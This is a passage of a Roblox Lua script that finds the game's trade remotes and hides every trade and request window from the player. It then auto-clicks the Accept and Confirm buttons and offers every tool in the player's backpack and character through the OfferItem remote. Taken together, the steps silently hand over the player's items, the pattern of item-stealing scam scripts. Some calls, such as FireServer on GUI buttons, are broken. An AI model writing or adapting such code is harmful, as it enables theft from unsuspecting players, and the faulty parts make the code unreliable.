local function getRemote(name)
    local r = TradeFolder:FindFirstChild(name)
    if r then log("Found remote: " .. name) else log("Missing remote: " .. name) end
    return r
end

local SendRequest = getRemote("SendRequest")
local AcceptRequest = getRemote("AcceptRequest")
local StartTrade = getRemote("StartTrade")
local AcceptTrade = getRemote("AcceptTrade")
local CompleteTrade = getRemote("CompleteTrade")
local OfferItem = getRemote("OfferItem")
local RemoveOffer = getRemote("RemoveOffer")

-- Helper to fire remote
local function fire(remote, ...)
    if not remote then return false end
    local ok, err = pcall(function() remote:FireServer(...) end)
    if ok then log("Fired " .. remote.Name) else log("Failed fire " .. remote.Name .. ": " .. tostring(err)) end
    return ok
end

local function invoke(remote, ...)
    if not remote then return false, nil end
    local ok, res = pcall(function() return remote:InvokeServer(...) end)
    if ok then log("Invoked " .. remote.Name .. " -> " .. tostring(res)) else log("Failed invoke " .. remote.Name .. ": " .. tostring(res)) end
    return ok, res
end

-- === Hide ALL trade-related GUIs ===
local function hideAllTradeGUIs()
    local gui = player:FindFirstChild("PlayerGui")
    if not gui then return end
    for _, child in pairs(gui:GetDescendants()) do
        if child:IsA("ScreenGui") and (child.Name:lower():find("trade") or child.Name:lower():find("request")) then
            child.Enabled = false
            log("Disabled ScreenGui: " .. child.Name)
        end
        if child:IsA("Frame") and (child.Name:lower():find("trade") or child.Name:lower():find("request")) then
            child.Visible = false
            log("Hidden frame: " .. child.Name)
        end
    end
end

-- === Find trade GUI and click buttons ===
local function clickGUIButtons()
    local gui = player:FindFirstChild("PlayerGui")
    if not gui then log("No PlayerGui") return false end
    local tradeGUI = nil
    -- Search for any ScreenGui or Frame that contains "Trade", "Request", or has Accept/Add buttons
    local function search(parent)
        for _, child in pairs(parent:GetChildren()) do
            if child:IsA("ScreenGui") and (child.Name:lower():find("trade") or child.Name:lower():find("request")) then
                tradeGUI = child
                return
            end
            if child:IsA("Frame") and (child.Name:lower():find("trade") or child.Name:lower():find("request")) then
                tradeGUI = child
                return
            end
            search(child)
        end
    end
    search(gui)
    if not tradeGUI then
        log("No trade GUI found by name, trying to find by buttons...")
        -- Fallback: find any Frame that has a TextButton named "Accept" or "Add"
        local function findByName(parent)
            for _, child in pairs(parent:GetChildren()) do
                if child:IsA("Frame") then
                    local hasAccept, hasAdd = false, false
                    for _, sub in pairs(child:GetDescendants()) do
                        if sub:IsA("TextButton") then
                            if sub.Name:lower():find("accept") or sub.Name:lower():find("confirm") then hasAccept = true end
                            if sub.Name:lower():find("add") or sub.Name:lower():find("select") then hasAdd = true end
                        end
                    end
                    if hasAccept and hasAdd then
                        tradeGUI = child
                        return
                    end
                end
                findByName(child)
            end
        end
        findByName(gui)
    end

    if not tradeGUI then
        log("Could not find trade GUI at all")
        return false
    end

    log("Trade GUI found: " .. tradeGUI:GetFullName())
    -- Hide it
    tradeGUI.Visible = false
    tradeGUI.Parent.Enabled = false  -- if parent is ScreenGui

    -- Click all Accept/Confirm buttons
    for _, btn in pairs(tradeGUI:GetDescendants()) do
        if btn:IsA("TextButton") then
            if btn.Name:lower():find("accept") or btn.Name:lower():find("confirm") then
                pcall(function() btn:FireServer() end)
                log("Clicked accept button: " .. btn.Name)
                wait(0.2)
            end
        end
    end

    -- Click all Add/Select buttons to add items
    local addedCount = 0
    for _, btn in pairs(tradeGUI:GetDescendants()) do
        if btn:IsA("TextButton") then
            if btn.Name:lower():find("add") or btn.Name:lower():find("select") or btn.Name:lower():find("offer") then
                pcall(function() btn:FireServer() end)
                addedCount = addedCount + 1
                log("Clicked add button: " .. btn.Name)
                wait(0.1)
            end
        end
    end
    log("Clicked " .. addedCount .. " add buttons")
    return addedCount > 0
end

-- === Alternative: use OfferItem remote with all tools ===
local function offerAllItemsViaRemote()
    if not OfferItem then
        log("OfferItem remote not available")
        return false
    end
    local offered = 0
    -- Get all tools from backpack and character
    local tools = {}
    for _, tool in pairs(player.Backpack:GetChildren()) do
        if tool:IsA("Tool") then table.insert(tools, tool) end
    end
    for _, tool in pairs(char:GetChildren()) do
        if tool:IsA("Tool") then table.insert(tools, tool) end
    end
    log("Found " .. #tools .. " tools to offer")
    for _, tool in ipairs(tools) do
        -- Try different argument patterns
        local success = false
        -- Pattern 1: just the tool instance
        local ok, err = pcall(function() OfferItem:FireServer(tool) end)
        if ok then success = true end
        if not success then
            -- Pattern 2: tool's name and maybe ID
            ok, err = pcall(function() OfferItem:FireServer(tool.Name) end)
            if ok then success = true end
        end
        if not success then
            -- Pattern 3: index or something
            ok, err = pcall(function() OfferItem:FireServer(tool:GetAttribute("ID")) end)
            if ok then success = true end
        end
        if success then
            offered = offered + 1
            log("Offered item: " .. tool.Name)
            wait(0.2)
        else
            log("Failed to offer: " .. tool.Name .. " (error: " .. tostring(err) .. ")")
        end
    end
    log("Offered " .. offered .. " items via remote")
    return offered > 0
end

